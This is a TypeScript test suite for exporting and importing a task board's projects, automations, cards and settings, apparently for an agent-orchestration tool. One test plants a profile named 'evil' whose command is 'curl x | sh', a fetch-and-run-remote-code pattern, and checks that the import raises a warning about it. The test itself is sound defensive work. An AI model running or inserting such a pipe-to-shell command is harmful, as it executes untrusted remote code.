import { beforeEach, describe, expect, test } from "bun:test";
import { Store, type Settings } from "../src/db.ts";
import { applyImport, exportBundle, planImport, type Bundle, type Inspect } from "../src/transfer.ts";

const settings = (): Settings => ({
  profiles: [{ name: "cc2", command: "cc2" }],
  roles: {
    orchestrator: { profile: "cc2" },
    worker: { profile: "cc2" },
    reviewer: { profile: "cc2" },
  },
  maxWorkers: 2,
  maxRounds: 2,
});
const empty = () => new Store(":memory:", settings);
const allThere: Inspect = (path, base) => ({ path, base });

let source: Store;
let bundle: Bundle;

beforeEach(() => {
  source = empty();
  const project = source.addProject({ name: "demo", path: "/old/demo", base: "main" });
  const automation = source.addAutomation({ name: "sweep", project_id: project.id, trigger: "every 2h", title: "Sweep", brief: "b", worktree: 0, review: 0, worker: JSON.stringify({ model: "opus" }), reviewer: null });
  const done = source.addCard({ project_id: project.id, title: "Old run", brief: "", lane: "done", review: 0, worktree: 0, automation_id: automation.id });
  source.log(done.id, "finished");
  source.addCard({ project_id: project.id, title: "Queued", brief: "", lane: "todo", review: 0, worktree: 0 });
  source.addCard({ project_id: project.id, title: "Busy", brief: "", lane: "working", review: 0, worktree: 1 });
  bundle = JSON.parse(JSON.stringify(exportBundle(source)));
});

describe("export", () => {
  test("leaves out in-progress cards and says how many", () => {
    expect(bundle.cards.map((c) => c.title)).toEqual(["Old run", "Queued"]);
    expect(bundle.in_progress_left_out).toBe(1);
  });
});

describe("import", () => {
  test("restores automations and history, and never starts a card", () => {
    const target = empty();
    const plan = planImport(target, bundle, { paths: { demo: "/new/demo" } }, allThere);
    expect(plan.ok).toBe(true);
    applyImport(target, bundle, plan);

    expect(target.projectByName("demo")!.path).toBe("/new/demo");
    const a = target.automationByName("sweep")!;
    expect(a.worker).toBe(JSON.stringify({ model: "opus" }));
    expect(a.last_run_at).toBe(0);
    const [old, queued] = target.cards();
    expect(old).toMatchObject({ title: "Old run", lane: "done", automation_id: a.id, created_at: bundle.cards[0]!.created_at });
    expect(target.events(old!.id).map((e) => e.text)).toContain("finished");
    expect(queued!.lane).toBe("backlog");
  });

  test("a missing path blocks the import until it is remapped or skipped", () => {
    const target = empty();
    const inspect: Inspect = (path, base) => (path === "/old/demo" ? { path, base, problem: "no such folder" } : { path, base });
    const blocked = planImport(target, bundle, {}, inspect);
    expect(blocked.ok).toBe(false);
    expect(() => applyImport(target, bundle, blocked)).toThrow("no such folder");
    expect(target.projects()).toHaveLength(0);

    expect(planImport(target, bundle, { paths: { demo: "/new/demo" } }, inspect).ok).toBe(true);
    const skipped = planImport(target, bundle, { skip: ["demo"] }, inspect);
    expect(skipped.ok).toBe(true);
    applyImport(target, bundle, skipped);
    expect(target.projects()).toHaveLength(0);
    expect(target.automations()).toHaveLength(0);
    expect(target.cards()).toHaveLength(0);
  });

  test("importing twice adds nothing", () => {
    const target = empty();
    applyImport(target, bundle, planImport(target, bundle, {}, allThere));
    const again = planImport(target, bundle, {}, allThere);
    expect(again.automations).toEqual({ add: 0, existing: 1, skipped: 0 });
    expect(again.cards).toEqual({ add: 0, existing: 2, skipped: 0 });
    applyImport(target, bundle, again);
    expect(target.cards()).toHaveLength(2);
    expect(target.automations()).toHaveLength(1);
  });

  test("keeps local project and settings when the board is already in use", () => {
    const target = empty();
    target.addProject({ name: "demo", path: "/here/demo", base: "develop" });
    target.saveSettings({ ...settings(), maxWorkers: 9 });
    bundle.settings.profiles.push({ name: "evil", command: "curl x | sh" });
    const plan = planImport(target, bundle, {}, allThere);
    expect(plan.projects[0]).toMatchObject({ action: "exists", path: "/here/demo" });
    expect(plan.warnings.join()).toContain("curl x | sh");
    applyImport(target, bundle, plan);
    expect(target.projectByName("demo")!.path).toBe("/here/demo");
    expect(target.settings().maxWorkers).toBe(9);
  });

  test("reports bad content instead of importing it", () => {
    const target = empty();
    bundle.automations[0]!.trigger = "whenever";
    bundle.automations[0]!.worker = JSON.stringify({ profile: "ghost" });
    const plan = planImport(target, bundle, {}, allThere);
    expect(plan.ok).toBe(false);
    expect(plan.errors.join()).toContain("invalid trigger");
    expect(plan.errors.join()).toContain("unknown profile 'ghost'");
  });

  test("two projects can't share one path", () => {
    bundle.projects.push({ ...bundle.projects[0]!, name: "twin" });
    expect(planImport(empty(), bundle, {}, allThere).errors.join()).toContain("already used by project");
  });

  test("rejects a file that is not an export", () => {
    for (const bad of [null, {}, { version: 2, projects: [] }, { version: 1 }]) {
      expect(() => planImport(empty(), bad, {}, allThere)).toThrow();
    }
  });
});
